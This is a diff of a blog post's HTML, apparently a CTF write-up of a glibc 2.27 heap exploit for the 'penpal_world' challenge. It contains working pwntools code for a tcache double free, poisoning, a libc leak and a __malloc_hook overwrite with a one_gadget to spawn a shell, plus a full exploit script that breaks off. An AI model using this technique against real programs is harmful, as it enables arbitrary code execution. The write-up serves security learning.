-<p>Now let’s take a look after the 1st free:<br><a data-fancybox="gallery" href="https://i.imgur.com/bZTPxZ1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bZTPxZ1.png" alt><br></a></p>
-<p>Lets check how tcache fast bin list is looking by using tcachebins on pwngdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/iWd1MMW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iWd1MMW.png" alt><br></a></p>
-<p>After 2nd free (Double free)<br><a data-fancybox="gallery" href="https://i.imgur.com/9jy4cUV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/9jy4cUV.png" alt><br></a></p>
-<p>Lets check again how tcache bin list is looking by using tcachebins on pwngdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/kjCR5aR.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kjCR5aR.png" alt><br></a></p>
+<p>Lets put a breakpoint on free and look how the first chunk looks like before free it the first time:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>Gdb output:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/brUzymx.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/brUzymx.png" alt><br>
+</a></p>
+<p>Now let’s take a look after the 1st free:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/bZTPxZ1.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/bZTPxZ1.png" alt><br>
+</a></p>
+<p>Lets check how tcache fast bin list is looking by using tcachebins on pwngdb:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/iWd1MMW.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/iWd1MMW.png" alt><br>
+</a></p>
+<p>After 2nd free (Double free)<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/9jy4cUV.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/9jy4cUV.png" alt><br>
+</a></p>
+<p>Lets check again how tcache bin list is looking by using tcachebins on pwngdb:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/kjCR5aR.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/kjCR5aR.png" alt><br>
+</a></p>
 <p>Now if we read the card at index 0 we will get a heap leak!</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br></pre></td></tr></table></figure>
-<p>Results:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./penpal_world'</span>: pid 2596</span><br><span class="line">[*] 0x55d9117e3200</span><br><span class="line">[*] Stopped process <span class="string">'./penpal_world'</span> (pid 2596)</span><br></pre></td></tr></table></figure></p>
-<h3 id="LEAKING-LIBC"><a href="#LEAKING-LIBC" class="headerlink" title="LEAKING LIBC"></a>LEAKING LIBC</h3><p>We can only do mallocs of size <strong>0x48</strong>, we somehow need to overwrite the size of one chunk because fastbin chunk sizes will only get us heap addresses, in order to leak a libc address we need a unsorted bin chunk size for example 0x91 will do it. </p>
+<p>Results:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python test.py</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./penpal_world'</span>: pid 2596</span><br><span class="line">[*] 0x55d9117e3200</span><br><span class="line">[*] Stopped process <span class="string">'./penpal_world'</span> (pid 2596)</span><br></pre></td></tr></table></figure>
+<h3 id="leaking-libc"><a class="markdownIt-Anchor" href="#leaking-libc"></a> LEAKING LIBC</h3>
+<p>We can only do mallocs of size <strong>0x48</strong>, we somehow need to overwrite the size of one chunk because fastbin chunk sizes will only get us heap addresses, in order to leak a libc address we need a unsorted bin chunk size for example 0x91 will do it.</p>
 <p>Perhaps since this version of libc uses <strong>tcache</strong>, at every chunk bellow 0x410 are treated as it was a fastbin chunk even if we free a 0x91 chunk we will not get a libc address, luckily there is a <strong>limit</strong> to the tcache which is <strong>7</strong>  we need to fill a <strong>tcache bin</strong> of size 0x91, we can do it by freeing that chunk 7 times the 8th time will be treated as an unsorted bin updating both fd and bk pointers into libc addresses.</p>
 <p>But to overwrite the size of a chunk we need to use the <strong>tcache poisoning attack</strong> you can find an example <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">here</a>.</p>
 <p>In the end we want malloc to return an arbitrary address where we can start writing stuff into an address that is able  to overwrite the size of 0x51 to 0x91, when malloc executes it will try to find a chunk in the <strong>tcache bin</strong> of that size so it can reuse the same space in memory from previous freed chunks, if we <strong>modify</strong> the fd pointer with <strong>UAF</strong>, malloc will instead return the pointer we modified getting us an <strong>arbitrary write</strong>.</p>
-<p>First we need to find a cool address we can write to, we already leaked a heap address, we just need to find the offset near the 0x51 size, we can do it with this:<br><a data-fancybox="gallery" href="https://i.imgur.com/Ya6ZWlt.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ya6ZWlt.png" alt><br></a></p>
-<p>The code to overwrite the size would look like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) ALLOCATE CHUNK B and prevent merge with top chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br></pre></td></tr></table></figure></p>
+<p>First we need to find a cool address we can write to, we already leaked a heap address, we just need to find the offset near the 0x51 size, we can do it with this:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/Ya6ZWlt.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/Ya6ZWlt.png" alt><br>
+</a></p>
+<p>The code to overwrite the size would look like this:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) ALLOCATE CHUNK B and prevent merge with top chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br></pre></td></tr></table></figure>
 <p>After changing the <strong>FD</strong> with edit we need to do two mallocs until we get the right pointer, because on the first two frees the single linked list of the tcache chunks(0x50) is like this:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x60 -&gt; heap+0x60 &lt;- 0x0</span><br></pre></td></tr></table></figure>
 <p>After editing the FD with <strong>heap+0x90</strong> we get this:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure>
-<p>The list after the first malloc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure></p>
-<p>The list after the second malloc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0 (empty)</span><br></pre></td></tr></table></figure></p>
-<p>The next step is to fill tcache bin (0x90) remember the max is 7 so we need to free 7 times. </p>
-<p>Also we need to add 2 new chunks and create two fake chunks in the end to bypass the security check from <strong>int_free</strong>, since it isn’t a tcache bin we need to worry about that. </p>
+<p>The list after the first malloc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure>
+<p>The list after the second malloc:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0 (empty)</span><br></pre></td></tr></table></figure>
+<p>The next step is to fill tcache bin (0x90) remember the max is 7 so we need to free 7 times.</p>
+<p>Also we need to add 2 new chunks and create two fake chunks in the end to bypass the security check from <strong>int_free</strong>, since it isn’t a tcache bin we need to worry about that.</p>
 <p>The size field of the next chunk should correspond to the size that has overwritten the size of chunk B and with a valid size with its flag prev_in_use set to 1.</p>
 <p>The <strong>lowest</strong> bit of size is the prev_in_use flag, 0x51 represented in binary is 0101000<strong>1</strong>, the lowest bit is set to one.</p>
 <p>PREV_INUSE, <strong>records</strong> whether the previous chunk is allocated. In general, the P bit of the size field of the <strong>first allocated memory block</strong> in the heap is set to <strong>1</strong> to prevent access to the previous <strong>illegal memory</strong>. When the P bit of the size of a chunk is 0, we can get the <strong>size</strong> and <strong>address</strong> of the previous chunk through the <strong>prev_size</strong> field.</p>
-<p>The Chunk C is for this security check <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280</a><br><a data-fancybox="gallery" href="https://i.imgur.com/uGz3Eu9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uGz3Eu9.png" alt><br></a></p>
+<p>The Chunk C is for this security check <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280</a><br>
+<a data-fancybox="gallery" href="https://i.imgur.com/uGz3Eu9.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/uGz3Eu9.png" alt><br>
+</a></p>
 <p>The Chunk D is to prevent going into unlink at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303</a> :</p>
-<p><a data-fancybox="gallery" href="https://i.imgur.com/Ir1dvEf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ir1dvEf.png" alt><br></a></p>
-<p>if we set nextinuse into 1 we won’t get an error at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405</a> because we don’t even enter at unlink<br><a data-fancybox="gallery" href="https://i.imgur.com/biRvmS1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/biRvmS1.png" alt><br></a></p>
-<p>One final thing, we already knew that we needed to set a fake chunk at chunk C with prev_in_use to 1 but why the size of 0x50 ? as you can see the function that calculates the offset to the <strong>prev_in_use</strong> of the fake chunk at chunk D uses function <strong>inuse_bit_at_offset</strong> which uses the size of previous 0x50(variable s) to find chunks D prev_in_use.<br><a data-fancybox="gallery" href="https://i.imgur.com/OqsTjG3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OqsTjG3.png" alt><br></a></p>
+<a data-fancybox="gallery" href="https://i.imgur.com/Ir1dvEf.png" target="_blank" rel="noopener">
+![](https://i.imgur.com/Ir1dvEf.png)
+</a>
+<p>if we set nextinuse into 1 we won’t get an error at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405</a> because we don’t even enter at unlink<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/biRvmS1.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/biRvmS1.png" alt><br>
+</a></p>
+<p>One final thing, we already knew that we needed to set a fake chunk at chunk C with prev_in_use to 1 but why the size of 0x50 ? as you can see the function that calculates the offset to the <strong>prev_in_use</strong> of the fake chunk at chunk D uses function <strong>inuse_bit_at_offset</strong> which uses the size of previous 0x50(variable s) to find chunks D prev_in_use.<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/OqsTjG3.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/OqsTjG3.png" alt><br>
+</a></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))) <span class="comment"># TO PREVENT double free or corruption (!prev)</span></span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>))) <span class="comment"># TO PREVENT corrupted size vs. prev_size (as long as prev_in_use is set any values work (0x1,0x51,0x61 etc..)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
-<p>Lets see how this looks in GDB, this is the look of tcache bins(0x90) after the 7 frees:<br><a data-fancybox="gallery" href="https://i.imgur.com/ropfJc7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ropfJc7.png" alt><br></a></p>
-<p>Now the 8th free which is the unsorted bin:<br><a data-fancybox="gallery" href="https://i.imgur.com/d0JaLL7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d0JaLL7.png" alt><br></a></p>
-<h3 id="Overwrite-malloc-hook-with-the-address-of-a-one-gadget"><a href="#Overwrite-malloc-hook-with-the-address-of-a-one-gadget" class="headerlink" title="Overwrite __malloc_hook with the address of a one gadget"></a>Overwrite __malloc_hook with the address of a one gadget</h3><p>Malloc hook executes with malloc (it’s used for debugging) initially is set to 0x0 , using <strong>TCACHE POISONING</strong> we can overwrite its address with the address of <strong>onegadget</strong>. Getting a free shell after triggering malloc.</p>
+<p>Lets see how this looks in GDB, this is the look of tcache bins(0x90) after the 7 frees:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/ropfJc7.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/ropfJc7.png" alt><br>
+</a></p>
+<p>Now the 8th free which is the unsorted bin:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/d0JaLL7.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/d0JaLL7.png" alt><br>
+</a></p>
+<h3 id="overwrite-__malloc_hook-with-the-address-of-a-one-gadget"><a class="markdownIt-Anchor" href="#overwrite-__malloc_hook-with-the-address-of-a-one-gadget"></a> Overwrite __malloc_hook with the address of a one gadget</h3>
+<p>Malloc hook executes with malloc (it’s used for debugging) initially is set to 0x0 , using <strong>TCACHE POISONING</strong> we can overwrite its address with the address of <strong>onegadget</strong>. Getting a free shell after triggering malloc.</p>
 <p>Getting the onegadget offset using <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-2.27.so </span><br><span class="line">0x4f2c5 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
-<p>The offset that works with the restriction is 0x10a38c.<br>Making malloc to return the address of <strong>__malloc_hook</strong> and overwriting it with onegadget:</p>
+<p>The offset that works with the restriction is 0x10a38c.<br>
+Making malloc to return the address of <strong>__malloc_hook</strong> and overwriting it with onegadget:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>The full exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('/glibc/2.27/64/lib/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc<span class="comment">#ELF('/glibc/2.27/64/lib/libc-2.27.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#rop=ROP([libc])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    <span class="comment">#bp = [0xea0,0xd31,0xc52]</span></span><br><span class="line">    <span class="comment">#bp = [0x00000dfb,0x00000b7c,0x00000d10]</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span 